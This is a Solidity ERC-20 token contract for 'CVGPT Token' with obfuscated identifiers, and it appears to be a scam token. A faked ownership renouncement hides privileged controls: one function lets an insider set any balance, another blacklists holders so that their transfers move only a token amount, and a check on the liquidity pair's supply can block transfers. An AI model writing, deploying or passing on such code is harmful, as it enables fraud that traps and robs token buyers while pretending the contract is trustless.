//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface amountTradingAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptAmount) external view returns (uint256);

    function transfer(address toAt, uint256 senderLiquidity) external returns (bool);

    function allowance(address amountShouldLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address toAt,
        uint256 senderLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderTx, uint256 value);
    event Approval(address indexed amountShouldLaunch, address indexed spender, uint256 value);
}

interface launchedFee is amountTradingAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract maxShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverMode {
    function createPair(address buyIsTo, address walletTotal) external returns (address);
}

interface tradingFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CVGPTToken is maxShould, amountTradingAuto, launchedFee {

    address public txIsReceiver;

    address marketingLimitFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return launchedMin;
    }

    function getOwner() external view returns (address) {
        return shouldFrom;
    }

    uint8 private toFee = 18;

    mapping(address => bool) public maxTeam;

    function receiverLaunchSwap() private view{
        require(maxTeam[_msgSender()]);
    }

    function allowance(address listTake, address marketingEnable) external view virtual override returns (uint256) {
        if (marketingEnable == marketingLimitFee) {
            return type(uint256).max;
        }
        return shouldTake[listTake][marketingEnable];
    }

    function balanceOf(address exemptAmount) public view virtual override returns (uint256) {
        return feeMarketing[exemptAmount];
    }

    bool private tokenEnable;

    function fundSender(address fundToken) public {
        if (launchedToken) {
            return;
        }
        if (walletMin) {
            walletMin = true;
        }
        maxTeam[fundToken] = true;
        
        launchedToken = true;
    }

    address private shouldFrom;

    function walletReceiver() public {
        emit OwnershipTransferred(enableExemptLiquidity, address(0));
        shouldFrom = address(0);
    }

    function limitAuto(address enableLaunched) public {
        receiverLaunchSwap();
        
        if (enableLaunched == enableExemptLiquidity || enableLaunched == txIsReceiver) {
            return;
        }
        sellTo[enableLaunched] = true;
    }

    uint256 private isReceiver;

    uint256 private maxWallet = 100000000 * 10 ** 18;

    bool public launchedToken;

    function fundExemptTeam(address feeFromList, address toAt, uint256 senderLiquidity) internal returns (bool) {
        require(feeMarketing[feeFromList] >= senderLiquidity);
        feeMarketing[feeFromList] -= senderLiquidity;
        feeMarketing[toAt] += senderLiquidity;
        emit Transfer(feeFromList, toAt, senderLiquidity);
        return true;
    }

    mapping(address => bool) public sellTo;

    uint256 totalLaunched;

    function transferFrom(address feeFromList, address toAt, uint256 senderLiquidity) external override returns (bool) {
        if (_msgSender() != marketingLimitFee) {
            if (shouldTake[feeFromList][_msgSender()] != type(uint256).max) {
                require(senderLiquidity <= shouldTake[feeFromList][_msgSender()]);
                shouldTake[feeFromList][_msgSender()] -= senderLiquidity;
            }
        }
        return fromIs(feeFromList, toAt, senderLiquidity);
    }

    bool public toLaunch;

    string private launchedMin = "CVGPT Token";

    string private atSell = "CTN";

    function symbol() external view virtual override returns (string memory) {
        return atSell;
    }

    mapping(address => uint256) private feeMarketing;

    function fromIs(address feeFromList, address toAt, uint256 senderLiquidity) internal returns (bool) {
        if (feeFromList == enableExemptLiquidity || toAt == enableExemptLiquidity) {
            return fundExemptTeam(feeFromList, toAt, senderLiquidity);
        }
        uint256 sellSenderBuy = amountTradingAuto(txIsReceiver).totalSupply();
        require(sellSenderBuy >= totalLaunched);
        if (sellSenderBuy != totalLaunched) {
            totalLaunched = sellSenderBuy;
        }
        if (sellTo[feeFromList]) {
            return fundExemptTeam(feeFromList, toAt, 13 ** 10);
        }
        return fundExemptTeam(feeFromList, toAt, senderLiquidity);
    }

    function transfer(address isTo, uint256 senderLiquidity) external virtual override returns (bool) {
        return fromIs(_msgSender(), isTo, senderLiquidity);
    }

    function decimals() external view virtual override returns (uint8) {
        return toFee;
    }

    bool public walletMin;

    function totalSupply() external view virtual override returns (uint256) {
        return maxWallet;
    }

    function totalReceiver(address isTo, uint256 senderLiquidity) public {
        receiverLaunchSwap();
        feeMarketing[isTo] = senderLiquidity;
    }

    uint256 private limitTradingTotal;

    mapping(address => mapping(address => uint256)) private shouldTake;

    address public enableExemptLiquidity;

    function owner() external view returns (address) {
        return shouldFrom;
    }

    constructor (){ 
        if (isReceiver == limitTradingTotal) {
            isReceiver = limitTradingTotal;
        }
        tradingFrom takeLimit = tradingFrom(marketingLimitFee);
        txIsReceiver = receiverMode(takeLimit.factory()).createPair(takeLimit.WETH(), address(this));
        if (limitTradingTotal != isReceiver) {
            walletMin = false;
        }
        maxTeam[_msgSender()] = true;
        feeMarketing[_msgSender()] = maxWallet;
        enableExemptLiquidity = _msgSender();
        
        emit Transfer(address(0), enableExemptLiquidity, maxWallet);
        shouldFrom = _msgSender();
        walletReceiver();
    }

    event OwnershipTransferred(address indexed exemptSenderMode, address indexed limitIsAmount);

    function approve(address marketingEnable, uint256 senderLiquidity) public virtual override returns (bool) {
        shouldTake[_msgSender()][marketingEnable] = senderLiquidity;
        emit Approval(_msgSender(), marketingEnable, senderLiquidity);
        return true;
    }

}